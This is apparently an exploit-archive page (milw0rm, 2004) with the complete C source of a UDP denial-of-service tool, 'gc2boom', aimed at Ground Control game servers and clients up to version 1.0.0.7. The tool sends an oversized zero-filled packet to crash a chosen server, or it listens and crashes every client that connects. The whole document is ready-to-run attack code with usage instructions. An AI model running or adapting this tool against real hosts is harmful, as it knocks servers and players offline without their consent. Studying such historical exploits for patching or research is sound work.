<html><head><title>Ground Control <= 1.0.0.7 (Server/Client) Denial of Service Exploit</title></head><pre>/*
by Luigi Auriemma
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;

#ifdef WIN32
 #include &lt;winsock.h&gt;
 #include &quot;winerr.h&quot;

 #define close closesocket
 #define ONESEC 1000
#else
 #include &lt;unistd.h&gt;
 #include &lt;sys/socket.h&gt;
 #include &lt;sys/types.h&gt;
 #include &lt;arpa/inet.h&gt;
 #include &lt;netdb.h&gt;

 #define ONESEC 1
#endif

#define VER &quot;0.1&quot;
#define PORT 42001
#define BUFFSZ 2048
#define BOOMSZ 1024 // 513 is enough
#define TIMEOUT 3
#define INFO &quot;\x58\x00\x00\x00&quot; /* build */ \
       &quot;\x52\x00&quot; /* protocol */ \
       &quot;\x0a\x00\x00&quot; /* gameinfo */
       /* this packet is not important, you can also use random data */

void show_gc2info(u_char *data, int len);
void unicode2char(u_char *data, int len);
int timeout(int sock);
u_long resolv(char *host);
void std_err(void);

int main(int argc, char *argv[]) {
 struct sockaddr_in peer;
 int sd,
     len,
     psz,
     on = 1,
     type,
     doubt = 0;
 u_short port = PORT;
 u_char buff[BUFFSZ];

 setbuf(stdout, NULL);

 fputs(&quot;\n&quot;
   &quot;Ground Control &lt;= 1.0.0.7 server/client crash &quot;VER&quot;\n&quot;
   &quot;by Luigi Auriemma\n&quot;
   &quot;e-mail: aluigi@altervista.org\n&quot;
   &quot;web: http://aluigi.altervista.org\n&quot;
   &quot;\n&quot;, stdout);

 if(argc &lt; 2) {
   printf(&quot;\nUsage: %s &lt;attack&gt; [port(%d)]\n&quot;
     &quot;\n&quot;
     &quot;Attack:\n&quot;
     &quot; c = broadcast clients crash\n&quot;
     &quot; s = server crash (can be also directly used versus a client)\n&quot;
     &quot; You must add the IP or the hostname of the server after the 
's'.\n&quot;
     &quot;\n&quot;
     &quot;Some usage examples:\n&quot;
     &quot; gc2boom c listens on port %d for clients\n&quot;
     &quot; gc2boom c 1234 listens on port 1234\n&quot;
     &quot; gc2boom s 192.168.0.1 tests the server 192.168.0.1 on port %d\n&quot;
     &quot; gc2boom s codserver 1234 tests the server codserver on port 
1234\n&quot;
     &quot;\n&quot;, argv[0], PORT, PORT, PORT);
   exit(1);
 }

#ifdef WIN32
 WSADATA wsadata;
 WSAStartup(MAKEWORD(1,0), &amp;wsadata);
#endif

 type = argv[1][0];
 if(type == 's') {
   if(!argv[2]) {
     fputs(&quot;\n&quot;
       &quot;Error: you must specify the server IP or hostname.\n&quot;
       &quot; Example: gc2boom s localhost\n&quot;
       &quot;\n&quot;, stdout);
     exit(1);
   }
   peer.sin_addr.s_addr = resolv(argv[2]);
   if(argc &gt; 3) port = atoi(argv[3]);
   printf(&quot;\n- Target %s:%hu\n\n&quot;,
     inet_ntoa(peer.sin_addr),
     port);
 } else if(type == 'c') {
   peer.sin_addr.s_addr = INADDR_ANY;
   if(argc &gt; 2) port = atoi(argv[2]);
   printf(&quot;\n- Listening on port %d\n&quot;, port);
 } else {
   fputs(&quot;\n&quot;
     &quot;Error: Wrong type of attack.\n&quot;
     &quot; You can choose between 2 types of attacks, versus clients with 'c' 
or\n&quot;
     &quot; versus servers with 's'\n&quot;
     &quot;\n&quot;, stdout);
   exit(1);
 }

 peer.sin_port = htons(port);
 peer.sin_family = AF_INET;
 psz = sizeof(peer);

 sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 if(sd &lt; 0) std_err();

 if(type == 's') {
   fputs(&quot;- Request informations\n&quot;, stdout);
   if(sendto(sd, INFO, sizeof(INFO) - 1, 0, (struct sockaddr *)&amp;peer, 
sizeof(peer))
    &lt; 0) std_err();
   if(timeout(sd) &lt; 0) {
     fputs(&quot;\n&quot;
       &quot;Alert: socket timeout, probably the server is not online or the 
port you have\n&quot;
       &quot; choosen is not exact.\n&quot;
       &quot; Check the \&quot;unreliableport\&quot; value in the server's 
informations.\n&quot;
       &quot; This tool now continue the attack\n&quot;, stdout);
       doubt = 1;
   } else {
     len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
     if(len &lt; 0) std_err();
     show_gc2info(buff, len);
   }

   memset(buff, 0x00, BOOMSZ);
   fputs(&quot;- Send BOOM packet\n&quot;, stdout);
   if(sendto(sd, buff, BOOMSZ, 0, (struct sockaddr *)&amp;peer, sizeof(peer))
    &lt; 0) std_err();

   fputs(&quot;- Wait one second for an exact check\n&quot;, stdout);
   sleep(ONESEC);

   fputs(&quot;- Check if server is vulnerable\n&quot;, stdout);
   if(sendto(sd, INFO, sizeof(INFO) - 1, 0, (struct sockaddr *)&amp;peer, 
sizeof(peer))
    &lt; 0) std_err();
   if(doubt) {
     fputs(&quot;\nI can't say if the host is vulnerable, check it 
manually\n\n&quot;, stdout);
   } else {
     if(timeout(sd) &lt; 0) {
       fputs(&quot;\nServer IS vulnerable!!!\n\n&quot;, stdout);
     } else {
       fputs(&quot;\nServer doesn't seem vulnerable\n\n&quot;, stdout);
     }
   }
 } else {
   if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&amp;on, sizeof(on))
    &lt; 0) std_err();
   if(bind(sd, (struct sockaddr *)&amp;peer, sizeof(peer))
    &lt; 0) std_err();
   fputs(&quot;Clients:\n&quot;, stdout);
   while(1) {
     len = recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&amp;peer, &amp;psz);
     if(len &lt; 0) std_err();
     buff[len] = 0x00;

     printf(&quot;%16s:%hu -&gt; %s\n&quot;,
       inet_ntoa(peer.sin_addr),
       ntohs(peer.sin_port),
       buff);

     memset(buff, 0x00, BOOMSZ);
     if(sendto(sd, buff, BOOMSZ, 0, (struct sockaddr *)&amp;peer, 
sizeof(peer))
      &lt; 0) std_err();
   }
 }

 close(sd);
 return(0);
}

void show_gc2info(u_char *data, int len) {
 u_char *ptr;
 int cp;

 printf(&quot;\n Build: %d&quot;, *(u_short *)data);
 printf(&quot;\n Protocol: %d&quot;, *(u_short *)(data + 4));
 printf(&quot;\n Gameinfo: %d&quot;, *(u_short *)(data + 6));
 ptr = data + 9;
 fputs(&quot;\n Server name: &quot;, stdout);
 unicode2char(ptr + 1, *ptr);
 fwrite(ptr + 1, 1, *ptr, stdout);
 ptr += (*ptr &lt;&lt; 1) + 1;
 fputs(&quot;\n Map: &quot;, stdout);
 ptr += fwrite(ptr + 1, 1, *ptr, stdout) + 1;
 fputs(&quot;\n External IP: &quot;, stdout);
 ptr += fwrite(ptr + 1, 1, *ptr, stdout) + 1;
 ptr += 4;
 cp = *ptr++;
 printf(&quot;\n Current players: %d&quot;, cp);
 printf(&quot;\n Max players: %d&quot;, *ptr++);
 printf(&quot;\n ???: %s&quot;, *ptr++ ? &quot;true&quot; : &quot;false&quot;);
 printf(&quot;\n Dedicated: %s&quot;, *ptr++ ? &quot;true&quot; : &quot;false&quot;);
 printf(&quot;\n Password: %s&quot;, *ptr++ ? &quot;true&quot; : &quot;false&quot;);
 ptr += 5;
 while(cp--) {
   fputs(&quot;\n Player: &quot;, stdout);
   unicode2char(ptr + 1, *ptr);
   fwrite(ptr + 1, 1, *ptr, stdout);
   ptr += (*ptr &lt;&lt; 1) + 1 + 6;
 }
 fputs(&quot;\n\n&quot;, stdout);
}

void unicode2char(u_char *data, int len) {
 u_char *out = data;

 while(len--) {
   *out++ = *data++;
   data++;
 }
}

int timeout(int sock) {
 struct timeval tout;
 fd_set fd_read;
 int err;

 tout.tv_sec = TIMEOUT;
 tout.tv_usec = 0;
 FD_ZERO(&amp;fd_read);
 FD_SET(sock, &amp;fd_read);
 err = select(sock + 1, &amp;fd_read, NULL, NULL, &amp;tout);
 if(err &lt; 0) std_err();
 if(!err) return(-1);
 return(0);
}

u_long resolv(char *host) {
 struct hostent *hp;
 u_long host_ip;

 host_ip = inet_addr(host);
 if(host_ip == INADDR_NONE) {
   hp = gethostbyname(host);
   if(!hp) {
     printf(&quot;\nError: Unable to resolve hostname (%s)\n&quot;, host);
     exit(1);
   } else host_ip = *(u_long *)(hp-&gt;h_addr);
 }
 return(host_ip);
}

#ifndef WIN32
 void std_err(void) {
   perror(&quot;\nError&quot;);
   exit(1);
 }
#endif

// milw0rm.com [2004-08-31]</pre></html>